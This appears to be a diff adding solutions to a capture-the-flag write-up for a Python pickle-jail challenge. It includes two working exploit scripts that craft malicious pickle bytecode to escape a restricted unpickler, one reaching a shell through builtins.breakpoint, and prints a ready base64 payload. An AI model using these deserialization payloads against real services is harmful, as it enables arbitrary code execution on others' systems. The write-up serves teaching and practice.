@@ -91,6 +91,57 @@ if __name__ == "__main__":
         print("Your pickles are fickle! >:~(")
 ```
 
-## solution
+## my solution (unintended)
 
-todo
+there is no `else` for step 3 so we can just get `__main__.__builtins__.breakpoint` and then get a shell basically
+
+```py
+from pickle import *
+from base64 import b64encode
+
+p = b''
+p += PROTO + b'\x04'
+p += 2*(GLOBAL + b'__main__\ntest\n')  # get to step 3
+p += GLOBAL + b'__main__\n' + b'__builtins__.breakpoint\n'
+p += EMPTY_TUPLE
+p += REDUCE
+
+print(b64encode(p))
+```
+
+encoded payload: `gARjX19tYWluX18KdGVzdApjX19tYWluX18KdGVzdApjX19tYWluX18KX19idWlsdGluc19fLmJyZWFrcG9pbnQKKVI=`
+
+## intended solution
+
+The attached script generates a right payload. The idea is that at step 3, there is no else statement so that we fallback to super().find_class(module, name) with the sole restriction that the module has to be main, and name must not contain ex or ev. The gist of it is that we can grab the NotAPickle class, and then instance it. Because of the call override, we can use the reduce bytecode to call load; this means we can use the same trick to grab other things, for instance NotAPickle.getattribute to get ''.join and then parts to get ''.join(parts)
+
+```py
+from pickletools import dis
+from base64 import b64encode
+
+def make(base, main = False):
+    if not main:
+        base = b'c__main__\n' + base + b'\n'
+
+    payload = b'c__main__\n\n0c__main__\n\n0' + base + b'.'
+    payload = b'\x80\x04\x95' + (0 + len(payload)).to_bytes(8, 'little') + payload
+
+    if not main:
+        return b'C' + bytes([len(payload)]) + payload + b'o)R'
+
+    return payload
+
+# get_items = b'\x80\x04c__main__\nparts.__getitem__'
+_attrs = make(b'NotAPickle.__getattribute__')
+_parts = make(b'parts')
+payload = make(b'(c__main__\nNotAPickle\n\x94' + _attrs + b'\x8c\x00\x8c\x04join\x86R' + b'(h\x00' + _parts + b'\x85R', main=True)
+
+dis(payload)
+print('*'*201)
+dis(_attrs[2:-2])
+print('*'*201)
+dis(_parts[2:-2])
+print('*'*201)
+
+print(b64encode(payload).decode())
+```
